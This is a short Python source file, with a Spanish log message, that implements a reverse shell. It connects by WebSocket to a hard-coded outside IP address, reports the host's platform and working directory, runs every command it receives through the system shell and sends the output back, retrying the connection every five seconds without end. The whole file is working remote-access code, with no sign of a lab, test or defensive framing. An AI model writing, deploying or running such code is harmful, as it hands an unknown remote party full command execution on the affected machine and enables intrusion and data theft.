from logger import console
import asyncio
import websockets
import subprocess
import os
import time
import sys
import json

def get_sysinfo():
    sysinfo = {'system': sys.platform, 'path': os.getcwd()}
    return json.dumps(sysinfo)

def run_cmd(cmd):
    output = subprocess.run(cmd, shell=True, capture_output=True)
    return json.dumps({'stdout': output.stdout.decode(), 'stderr': output.stderr.decode()})

async def shell(websocket):
    while True:
        cmd = await websocket.recv()
        if cmd == 'exit':
            break
        output = run_cmd(cmd)
        await websocket.send(output)

async def conection():
    uri = 'ws://142.93.62.130:45500'
    async with websockets.connect(uri) as websocket:
        await websocket.send(get_sysinfo())
        await shell(websocket)

def start_conection():
    while True:
        try:
            asyncio.run(conection())
        except ConnectionRefusedError:
            console.warn('Conexión rechazada, intentando de nuevo 5s')
            time.sleep(5)



if __name__ == '__main__':
    start_conection()